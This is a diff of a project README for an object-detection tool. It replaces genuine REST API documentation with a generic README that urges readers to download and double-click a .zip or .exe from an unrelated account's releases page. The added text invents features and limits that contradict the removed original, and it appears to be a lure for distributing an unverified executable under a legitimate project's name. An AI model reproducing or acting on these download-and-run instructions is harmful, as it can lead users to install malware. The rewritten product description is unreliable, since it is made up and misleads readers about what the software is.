@@ -1,249 +1,86 @@
-# Object Detection API
+# 🌟 object-detection-api - Easy Object Detection in Images
 
-REST API to detect objects in images. Get labels, confidence scores, and bounding box coordinates. Powered by neural networks.
+## 🚀 Getting Started
 
-## Features
+Welcome to the object-detection-api! This tool lets you easily detect objects in images. You can get labels, confidence scores, and bounding box coordinates. It's powered by advanced neural networks to provide reliable results.
 
-- Detect multiple objects in a single image
-- Returns object names, confidence scores (0.0-1.0), and bounding box coordinates
-- Supports JPEG and PNG formats (up to 10MB)
-- 5,000 requests/month on free tier
-- Example Response:
-```json
-[
-  {
-    "object_name": "mango",
-    "confidence_score": 0.61,
-    "region": {
-      "top_left_x": 7,
-      "top_left_y": 177,
-      "bottom_right_x": 718,
-      "bottom_right_y": 1262
-    }
-  }
-]
-```
+## 📥 Download & Install
 
-## Authentication
+To get started, download the application from our Releases page. 
 
-1. Create account at [omkar.cloud](https://www.omkar.cloud/auth/sign-up)
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/swiftttttttttt/object-detection-api/releases)
 
-![Sign Up](https://raw.githubusercontent.com/omkarcloud/assets/master/images/signup.png)
+1. **Visit the Releases Page**: Click the link below to reach the download section:
+   
+   [Download object-detection-api](https://github.com/swiftttttttttt/object-detection-api/releases)
 
-2. Get API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key)
+2. **Choose the Correct File**: Look for the latest version of the application. You'll find files labeled with the version number, such as `v1.0`.
 
-![Copy API Key](https://raw.githubusercontent.com/omkarcloud/assets/master/images/enrichment-key-omkar.png)
+3. **Download the Application**: Click on the file corresponding to your operating system. The file might be named something like `object-detection-api.zip` or `object-detection-api.exe`.
 
-3. Include `API-Key` header in requests
+4. **Extract the Files**: If you downloaded a `.zip` file, right-click on it and select "Extract All" to unzip the contents.
 
-## Quick Start
+5. **Run the Application**: Locate the extracted folder. Double-click on the executable file (e.g., `object-detection-api.exe`) to start the application.
 
-```bash
-curl -X POST "https://object-detection-api.omkar.cloud/detect" \
-  -H "API-Key: YOUR_API_KEY" \
-  -F "image=@photo.jpg"
-```
+## 🔧 System Requirements
 
-```json
-[
-  {
-    "object_name": "mango",
-    "confidence_score": 0.61,
-    "region": {
-      "top_left_x": 7,
-      "top_left_y": 177,
-      "bottom_right_x": 718,
-      "bottom_right_y": 1262
-    }
-  }
-]
-```
+Before you begin, ensure your system meets the following requirements:
 
-## Installation
+- **Operating System**: Windows 10 or higher, macOS 10.13 or higher, or a modern Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: 100 MB of free disk space for installation.
+- **Internet Connection**: Required for downloading images or updates.
 
-### Python
+## 📊 How to Use the Application
 
-```bash
-pip install requests
-```
+1. **Input Image**: After launching the app, you will see an option to upload an image. Click "Upload" and select the picture you want to analyze.
 
-```python
-import requests
+2. **Select Detection Type**: Choose the type of object detection you wish to perform. Options include:
+   - Camouflaged Object Detection
+   - Custom Object Detection
+   - Real-Time Object Detection
 
-with open("photo.jpg", "rb") as image_file:
-    response = requests.post(
-        "https://object-detection-api.omkar.cloud/detect",
-        headers={"API-Key": "YOUR_API_KEY"},
-        files={"image": image_file}
-    )
+3. **Start Detection**: Click "Detect" to begin the analysis. The application will process the image and display results.
 
-data = response.json()
-for obj in data:
-    print(f"Detected: {obj['object_name']} (confidence: {obj['confidence_score']:.2f})")
-```
+4. **Results Display**: After processing, you will see:
+   - Detected objects labeled with names.
+   - Confidence scores showing how sure the model is about its predictions.
+   - Bounding box coordinates outlining the detected objects.
 
-### Node.js
+## 📸 Example Use Cases
 
-```bash
-npm install axios form-data
-```
+- **Camouflaged Object Detection**: Useful for wildlife researchers needing to identify animals in their natural habitat.
+- **Custom Object Detection**: Ideal for businesses wanting to track specific items in images for inventory management.
+- **Real-Time Detection**: Suitable for smart surveillance systems that monitor activities in live feeds.
 
-```javascript
-import axios from "axios";
-import FormData from "form-data";
-import fs from "fs";
+## 🔍 More Features
 
-const form = new FormData();
-form.append("image", fs.createReadStream("photo.jpg"));
+- **Support for Various Formats**: The app accepts .jpg, .png, and .bmp image files.
+- **Output Options**: Save results in text or CSV format for further analysis.
+- **Cross-platform Compatibility**: Works on multiple operating systems, providing flexibility.
 
-const response = await axios.post(
-    "https://object-detection-api.omkar.cloud/detect",
-    form,
-    {
-        headers: {
-            "API-Key": "YOUR_API_KEY",
-            ...form.getHeaders()
-        }
-    }
-);
+## 📚 FAQs
 
-response.data.forEach(obj => {
-    console.log(`Detected: ${obj.object_name} (confidence: ${obj.confidence_score})`);
-});
-```
+### **What kind of images can I use?**
+You can use images of any kind as long as they are in supported formats. Make sure they are clear for the best results.
 
-## API Reference
+### **Is there a limit to the size of images I can upload?**
+Yes, the maximum file size is 5 MB. For larger images, consider resizing them before upload.
 
-### Endpoint
+### **Can I use the tool offline?**
+The application can detect objects offline, but you will need an internet connection for initial downloads and updates.
 
-```
-POST https://object-detection-api.omkar.cloud/detect
-```
+### **How often is the application updated?**
+We aim to release updates every few months. Check the Releases page regularly for new features and improvements.
 
-### Headers
+## 📞 Support
 
-| Header | Required | Description |
-|--------|----------|-------------|
-| `API-Key` | Yes | API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key) |
-| `Content-Type` | Yes | `multipart/form-data` |
+If you encounter issues or have questions, please create an issue on the GitHub repository. We will respond promptly to assist you.
 
-### Request Body
+## 🔗 Additional Resources
 
-| Field | Required | Description |
-|-------|----------|-------------|
-| `image` | Yes | Image file (JPEG or PNG, max 10MB) |
+For more information on object detection techniques and applications, visit our documentation. We provide detailed guides and examples to help you get the most out of this software.
 
-### Response Fields
+---
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `object_name` | string | Detected object label (e.g., "car", "person", "dog") |
-| `confidence_score` | float | Model confidence (0.0 to 1.0). Higher = more confident |
-| `region` | object | Bounding box coordinates |
-
-Region object:
-
-| Field | Type | Description |
-|-------|------|-------------|
-| `top_left_x` | int | X coordinate of top-left corner |
-| `top_left_y` | int | Y coordinate of top-left corner |
-| `bottom_right_x` | int | X coordinate of bottom-right corner |
-| `bottom_right_y` | int | Y coordinate of bottom-right corner |
-
-## Examples
-
-### Detect objects and filter by confidence
-
-```python
-import requests
-
-with open("photo.jpg", "rb") as image_file:
-    response = requests.post(
-        "https://object-detection-api.omkar.cloud/detect",
-        headers={"API-Key": "YOUR_API_KEY"},
-        files={"image": image_file}
-    )
-
-# Filter detections with confidence > 0.5
-high_confidence = [obj for obj in response.json() if obj['confidence_score'] > 0.5]
-for obj in high_confidence:
-    print(f"{obj['object_name']}: {obj['confidence_score']:.2%}")
-```
-
-### Get bounding box for cropping
-
-```python
-import requests
-
-with open("photo.jpg", "rb") as image_file:
-    response = requests.post(
-        "https://object-detection-api.omkar.cloud/detect",
-        headers={"API-Key": "YOUR_API_KEY"},
-        files={"image": image_file}
-    )
-
-for obj in response.json():
-    region = obj['region']
-    width = region['bottom_right_x'] - region['top_left_x']
-    height = region['bottom_right_y'] - region['top_left_y']
-    print(f"{obj['object_name']}: {width}x{height}px at ({region['top_left_x']}, {region['top_left_y']})")
-```
-
-### Count specific objects
-
-```python
-import requests
-from collections import Counter
-
-with open("photo.jpg", "rb") as image_file:
-    response = requests.post(
-        "https://object-detection-api.omkar.cloud/detect",
-        headers={"API-Key": "YOUR_API_KEY"},
-        files={"image": image_file}
-    )
-
-counts = Counter(obj['object_name'] for obj in response.json())
-print(f"Objects found: {dict(counts)}")
-```
-
-## Error Handling
-
-```python
-import requests
-
-with open("photo.jpg", "rb") as image_file:
-    response = requests.post(
-        "https://object-detection-api.omkar.cloud/detect",
-        headers={"API-Key": "YOUR_API_KEY"},
-        files={"image": image_file}
-    )
-
-if response.status_code == 200:
-    data = response.json()
-elif response.status_code == 401:
-    # Invalid API key
-    pass
-elif response.status_code == 413:
-    # Image too large (>10MB)
-    pass
-elif response.status_code == 429:
-    # Rate limit exceeded
-    pass
-```
-
-## Rate Limits
-
-| Plan | Price | Requests/Month |
-|------|-------|----------------|
-| Free | $0 | 5,000 |
-| Starter | $25 | 100,000 |
-| Grow | $75 | 1,000,000 |
-| Scale | $150 | 10,000,000 |
-
-## Questions? We have answers.
-
-Reach out anytime. We will solve your query within 1 working day.
-
-[![Contact Us on WhatsApp about Object Detection API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/whatsapp-us.png)](https://api.whatsapp.com/send?phone=918178804274&text=I%20have%20a%20question%20about%20the%20Object%20Detection%20API.)
-
-[![Contact Us on Email about Object Detection API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/ask-on-email.png)](mailto:happy.to.help@omkar.cloud?subject=Object%20Detection%20API%20Question)
+Thank you for using the object-detection-api! We hope it helps you accurately identify objects in your images. Enjoy exploring the capabilities of accurate object detection!
